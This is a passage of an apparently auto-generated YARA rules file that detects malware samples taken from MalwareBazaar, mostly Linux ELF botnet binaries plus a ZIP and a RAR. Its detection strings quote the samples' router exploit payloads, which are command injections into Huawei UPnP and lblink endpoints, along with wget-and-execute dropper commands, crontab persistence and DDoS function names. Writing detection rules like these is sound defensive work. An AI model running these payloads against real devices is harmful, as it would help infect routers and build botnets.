      $s1 = "PROT_EXEC|PROT_WRITE failed." fullword ascii
      $s2 = "$Id: UPX 3.94 Copyright (C) 1996-2017 the UPX Team. All Rights Reserved. $" fullword ascii
      $s3 = "w; -5<" fullword ascii
      $s4 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" fullword ascii /* Goodware String - occured 1 times */
      $s5 = "n3'.iip" fullword ascii
      $s6 = " NUPX!" fullword ascii
      $s7 = "bSffW|R" fullword ascii
      $s8 = "qeGdi%&'e" fullword ascii
      $s9 = "\\6bQtYR" fullword ascii
      $s10 = "M( R5~" fullword ascii
      $s11 = "e[@)8)" fullword ascii
      $s12 = "t8!f<6g" fullword ascii
      $s13 = "$^tUa`E" fullword ascii
      $s14 = "6&N$!`" fullword ascii
      $s15 = "0S3}Y<" fullword ascii
      $s16 = "lkdjVa" fullword ascii
      $s17 = "Z7cQQZ" fullword ascii
      $s18 = ".w_A@Ie" fullword ascii
      $s19 = "pk1Ss;" fullword ascii
      $s20 = "~l)!d!d`" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule d80ca4b489b5cded17b43d9f3968ba89cf20b938e2aee69cdffcbf336b2539e4 {
   meta:
      description = "evidences - file d80ca4b489b5cded17b43d9f3968ba89cf20b938e2aee69cdffcbf336b2539e4.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "d80ca4b489b5cded17b43d9f3968ba89cf20b938e2aee69cdffcbf336b2539e4"
   strings:
      $s1 = "PROT_EXEC|PROT_WRITE failed." fullword ascii
      $s2 = "$Id: UPX 3.94 Copyright (C) 1996-2017 the UPX Team. All Rights Reserved. $" fullword ascii
      $s3 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" fullword ascii /* Goodware String - occured 1 times */
      $s4 = "2d\\hqfi?X" fullword ascii
      $s5 = "@kquPub_>" fullword ascii
      $s6 = "\"lCPH&32" fullword ascii
      $s7 = "pXGwxs)" fullword ascii
      $s8 = "b .FZf" fullword ascii
      $s9 = "8%i]5>" fullword ascii
      $s10 = "x%o:vsL" fullword ascii
      $s11 = "O3&+$e" fullword ascii
      $s12 = ":#KlZIH" fullword ascii
      $s13 = "QU\"7\"N" fullword ascii
      $s14 = "01tMv*" fullword ascii
      $s15 = "E?^ioo" fullword ascii
      $s16 = "{Lg_yk" fullword ascii
      $s17 = "t20>Bgyl" fullword ascii
      $s18 = " C9{P,kT" fullword ascii
      $s19 = "71IVKh" fullword ascii
      $s20 = "|*hDpw" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule sig_65c2e8a548a9aa24fb9a3157e5328aac8b00f991322bc058cb23e219092724ca {
   meta:
      description = "evidences - file 65c2e8a548a9aa24fb9a3157e5328aac8b00f991322bc058cb23e219092724ca.zip"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "65c2e8a548a9aa24fb9a3157e5328aac8b00f991322bc058cb23e219092724ca"
   strings:
      $s1 = "LazyDisYTUnlocker.exe" fullword ascii
      $s2 = "lhlhili" fullword ascii
      $s3 = "fpafVV." fullword ascii
      $s4 = "sJtRf=d" fullword ascii
      $s5 = "ybpvF?" fullword ascii
      $s6 = "}3pZZs`N9" fullword ascii
      $s7 = "XmrC[z5N" fullword ascii
      $s8 = "P%<URun" fullword ascii
      $s9 = "AyMyC9" fullword ascii
      $s10 = "hAevv6" fullword ascii
      $s11 = "3N}Z28^" fullword ascii
      $s12 = "8Oq+NI" fullword ascii
      $s13 = "w;\\~r:D{" fullword ascii
      $s14 = "2N[c)C![" fullword ascii
      $s15 = "y5M~o`N}" fullword ascii
      $s16 = "KT6]@{" fullword ascii
      $s17 = "|xQ'xT" fullword ascii
      $s18 = "Id=&Jxl" fullword ascii
      $s19 = "(L|Y4b" fullword ascii
      $s20 = "GtDq>(" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 300KB and
      8 of them
}

rule c49a8680bbcb91e569b5aa0a695358dcb913b95335fdc05b0b36b0368c0095ab {
   meta:
      description = "evidences - file c49a8680bbcb91e569b5aa0a695358dcb913b95335fdc05b0b36b0368c0095ab.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "c49a8680bbcb91e569b5aa0a695358dcb913b95335fdc05b0b36b0368c0095ab"
   strings:
      $s1 = "* .7e^" fullword ascii
      $s2 = "* [[43" fullword ascii
      $s3 = "{ %OX:\"" fullword ascii
      $s4 = "!QK^O:\\" fullword ascii
      $s5 = "FA\\sPy" fullword ascii
      $s6 = "=,gETF" fullword ascii
      $s7 = "*SHIPPING DOC  INVOICE NO.HCAB232450218.img" fullword ascii
      $s8 = "!- GdT@[oa5 c" fullword ascii
      $s9 = "FbOSXbs6" fullword ascii
      $s10 = "};%R_%" fullword ascii
      $s11 = "#A^<+ " fullword ascii
      $s12 = "Z%ut%u." fullword ascii
      $s13 = "9<Yxm-%N%)" fullword ascii
      $s14 = "4%+ Oz" fullword ascii
      $s15 = "|/Yrdsvtj" fullword ascii
      $s16 = "Mzdx.Q|" fullword ascii
      $s17 = "FGGVbUT',\"" fullword ascii
      $s18 = "BgcX!r" fullword ascii
      $s19 = "GqWE<'K" fullword ascii
      $s20 = "XDMDu\"" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 4000KB and
      8 of them
}

rule sig_6e4ba85cc1b0594d079a3232d439608f518087b4ac21add5bf4d65c8f121f449 {
   meta:
      description = "evidences - file 6e4ba85cc1b0594d079a3232d439608f518087b4ac21add5bf4d65c8f121f449.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "6e4ba85cc1b0594d079a3232d439608f518087b4ac21add5bf4d65c8f121f449"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 %s.p2 > /dev/null 2>&1" fullword ascii
      $s3 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s4 = "cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 %s.p1 > /dev/null 2>&1" fullword ascii
      $s5 = "wget http://%d.%d.%d.%d/2 -O /tmp/2; chmod 777 /tmp/2; /tmp/2 %s.p4 > /dev/null 2>&1" fullword ascii
      $s6 = "cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 %s.p3 > /dev/null 2>&1 &" fullword ascii
      $s7 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /h; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs; sh /tmp/.vs)</NewStatusURL><NewDown" ascii
      $s8 = "crontab /tmp/crontab.tmp" fullword ascii
      $s9 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s10 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s11 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s12 = "HOST: 255.255.255.255:1900" fullword ascii
      $s13 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s14 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s15 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s16 = "service:service-agent" fullword ascii
      $s17 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s18 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s19 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s20 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule sig_9bb3e85491646faf1935889fd6e0070a426e00992866d43ae6177345aefe0f48 {
   meta:
      description = "evidences - file 9bb3e85491646faf1935889fd6e0070a426e00992866d43ae6177345aefe0f48.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "9bb3e85491646faf1935889fd6e0070a426e00992866d43ae6177345aefe0f48"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $x2 = "/bin/bash -c \"sleep 10; rm -rf /tmp/%s; wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s > /dev/null 2>&1;" ascii
      $s3 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s4 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /h; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs; sh /tmp/.vs)</NewStatusURL><NewDown" ascii
      $s5 = "crontab /tmp/crontab.tmp > /dev/null 2>&1" fullword ascii
      $s6 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s7 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s8 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s9 = "HOST: 255.255.255.255:1900" fullword ascii
      $s10 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s11 = "/tmp/crontab.tmp" fullword ascii
      $s12 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s13 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s14 = "service:service-agent" fullword ascii
      $s15 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s16 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s17 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s18 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s19 = "%s > /dev/null 2>&1" fullword ascii
      $s20 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule a0f9fd63704b81084bb5316b26409b847d06b94a36194f13e23b83c2e852fedf {
   meta:
      description = "evidences - file a0f9fd63704b81084bb5316b26409b847d06b94a36194f13e23b83c2e852fedf.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "a0f9fd63704b81084bb5316b26409b847d06b94a36194f13e23b83c2e852fedf"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $x2 = "/bin/bash -c \"sleep 10; rm -rf /tmp/%s; wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s > /dev/null 2>&1;" ascii
      $s3 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s4 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /h; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs; sh /tmp/.vs)</NewStatusURL><NewDown" ascii
      $s5 = "crontab /tmp/crontab.tmp > /dev/null 2>&1" fullword ascii
      $s6 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s7 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s8 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s9 = "HOST: 255.255.255.255:1900" fullword ascii
      $s10 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s11 = "/tmp/crontab.tmp" fullword ascii
      $s12 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s13 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s14 = "service:service-agent" fullword ascii
      $s15 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s16 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s17 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s18 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s19 = "%s > /dev/null 2>&1" fullword ascii
      $s20 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule dc233a4be89edaa57ef7e141757f42f0c998f9b14b2e31a729a1cda30d1e70e7 {
   meta:
      description = "evidences - file dc233a4be89edaa57ef7e141757f42f0c998f9b14b2e31a729a1cda30d1e70e7.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "dc233a4be89edaa57ef7e141757f42f0c998f9b14b2e31a729a1cda30d1e70e7"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $x2 = "/bin/bash -c \"sleep 10; rm -rf /tmp/%s; wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s > /dev/null 2>&1;" ascii
      $s3 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s4 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /h; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs; sh /tmp/.vs)</NewStatusURL><NewDown" ascii
      $s5 = "crontab /tmp/crontab.tmp > /dev/null 2>&1" fullword ascii
      $s6 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s7 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s8 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s9 = "HOST: 255.255.255.255:1900" fullword ascii
      $s10 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s11 = "/tmp/crontab.tmp" fullword ascii
      $s12 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s13 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s14 = "service:service-agent" fullword ascii
      $s15 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s16 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s17 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s18 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s19 = "%s > /dev/null 2>&1" fullword ascii
      $s20 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule de8cd8fb2ee55f0fef55e8b9d16d8e9269315fe424bed74a61c02777c3c825b3 {
   meta:
      description = "evidences - file de8cd8fb2ee55f0fef55e8b9d16d8e9269315fe424bed74a61c02777c3c825b3.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "de8cd8fb2ee55f0fef55e8b9d16d8e9269315fe424bed74a61c02777c3c825b3"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s3 = "wget http://%d.%d.%d.%d/12 -O /tmp/12; chmod 777 /tmp/12; /tmp/12 %s.p4 > /dev/null 2>&1" fullword ascii
      $s4 = "cd /tmp; wget http://%d.%d.%d.%d/12; chmod 777 12; ./12 %s.p3 > /dev/null 2>&1 &" fullword ascii
      $s5 = "cd /tmp; wget http://%d.%d.%d.%d/12; chmod 777 12; ./12 %s.p2 > /dev/null 2>&1" fullword ascii
      $s6 = "cd /tmp; wget http://%d.%d.%d.%d/12; chmod 777 12; ./12 %s.p1 > /dev/null 2>&1" fullword ascii
      $s7 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /h; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs; sh /tmp/.vs)</NewStatusURL><NewDown" ascii
      $s8 = "crontab /tmp/crontab.tmp" fullword ascii
      $s9 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s10 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s11 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s12 = "HOST: 255.255.255.255:1900" fullword ascii
      $s13 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s14 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s15 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s16 = "service:service-agent" fullword ascii
      $s17 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s18 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s19 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s20 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule f6f3543047421d73a74deaec55d59843d0b0d648569795b8df64bd1de4ffdaeb {
   meta:
      description = "evidences - file f6f3543047421d73a74deaec55d59843d0b0d648569795b8df64bd1de4ffdaeb.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "f6f3543047421d73a74deaec55d59843d0b0d648569795b8df64bd1de4ffdaeb"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $x2 = "/bin/bash -c \"sleep 10; rm -rf /tmp/%s; wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s > /dev/null 2>&1;" ascii
      $s3 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s4 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /h; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs; sh /tmp/.vs)</NewStatusURL><NewDown" ascii
      $s5 = "crontab /tmp/crontab.tmp > /dev/null 2>&1" fullword ascii
      $s6 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s7 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s8 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s9 = "HOST: 255.255.255.255:1900" fullword ascii
      $s10 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s11 = "/tmp/crontab.tmp" fullword ascii
      $s12 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s13 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s14 = "service:service-agent" fullword ascii
      $s15 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s16 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s17 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s18 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s19 = "%s > /dev/null 2>&1" fullword ascii
      $s20 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_7e1226aa38a9f5e729bfce4b956ab068bb7aaf942c7fbba5effaca59bb7282d6 {
   meta:
      description = "evidences - file 7e1226aa38a9f5e729bfce4b956ab068bb7aaf942c7fbba5effaca59bb7282d6.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "7e1226aa38a9f5e729bfce4b956ab068bb7aaf942c7fbba5effaca59bb7282d6"
   strings:
      $s1 = "handle_command" fullword ascii
      $s2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" fullword ascii
      $s3 = "GET / HTTP/1.1" fullword ascii
      $s4 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" fullword ascii
      $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0" fullword ascii
      $s6 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" fullword ascii
      $s7 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/16.17017" fullword ascii
      $s8 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" fullword ascii
      $s9 = "daemonize" fullword ascii
      $s10 = "threads.0" fullword ascii
      $s11 = "http_attack" fullword ascii
      $s12 = "__stack_chk_fail@GLIBC_2.4" fullword ascii
      $s13 = "_IO_stdin_used" fullword ascii
      $s14 = "frame_dummy" fullword ascii
      $s15 = "pthread_create@GLIBC_2.34" fullword ascii
      $s16 = ".note.ABI-tag" fullword ascii
      $s17 = ".note.gnu.build-id" fullword ascii
      $s18 = "__FRAME_END__" fullword ascii
      $s19 = "completed.1" fullword ascii
      $s20 = "157.173.202.137" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 50KB and
      8 of them
}

rule sig_846c3d091bb301e02fed99388214a9278d29c35087f77184f045bc1a88c75d70 {
   meta:
      description = "evidences - file 846c3d091bb301e02fed99388214a9278d29c35087f77184f045bc1a88c75d70.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "846c3d091bb301e02fed99388214a9278d29c35087f77184f045bc1a88c75d70"
   strings:
      $s1 = "handle_command" fullword ascii
      $s2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" fullword ascii
      $s3 = "GET / HTTP/1.1" fullword ascii
      $s4 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" fullword ascii
      $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0" fullword ascii
      $s6 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" fullword ascii
      $s7 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/16.17017" fullword ascii
      $s8 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" fullword ascii
      $s9 = "__sparc_get_pc_thunk.l7" fullword ascii
      $s10 = "daemonize" fullword ascii
      $s11 = "threads.0" fullword ascii
      $s12 = "http_attack" fullword ascii
      $s13 = "__stack_chk_fail@GLIBC_2.4" fullword ascii
      $s14 = "_IO_stdin_used" fullword ascii
      $s15 = "pthread_create@GLIBC_2.34" fullword ascii
      $s16 = ".note.ABI-tag" fullword ascii
      $s17 = ".note.gnu.build-id" fullword ascii
      $s18 = "__FRAME_END__" fullword ascii
      $s19 = "completed.1" fullword ascii
      $s20 = "__thread_self" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 70KB and
      8 of them
}

rule c470f7a03f563d8b07da9ca64dfe6964e65a2f89fbd52990f2ef1e7b7579391b {
   meta:
      description = "evidences - file c470f7a03f563d8b07da9ca64dfe6964e65a2f89fbd52990f2ef1e7b7579391b.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "c470f7a03f563d8b07da9ca64dfe6964e65a2f89fbd52990f2ef1e7b7579391b"
   strings:
      $s1 = "handle_command" fullword ascii
      $s2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" fullword ascii
      $s3 = "GET / HTTP/1.1" fullword ascii
      $s4 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" fullword ascii
      $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0" fullword ascii
      $s6 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" fullword ascii
      $s7 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/16.17017" fullword ascii
      $s8 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" fullword ascii
      $s9 = "daemonize" fullword ascii
      $s10 = "threads.0" fullword ascii
      $s11 = "http_attack" fullword ascii
      $s12 = "_IO_stdin_used" fullword ascii
